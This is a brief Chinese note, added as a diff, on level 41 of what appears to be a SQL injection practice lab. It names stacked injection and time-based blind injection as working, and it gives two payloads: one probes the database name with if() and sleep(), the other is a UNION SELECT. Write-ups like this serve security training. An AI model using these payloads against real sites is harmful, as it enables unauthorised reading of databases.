@@ -1,0 +1,13 @@
+第41关
+
+可以堆叠注入
+
+前期要盲注
+if和sleep延时注入成功
+?id=1 and if((mid(database(),1,1)='y'),1,sleep(20))
+
+也可以直接弹回显
+?id=-1 union select 1,2,3
+
+
+闯关成功！！！
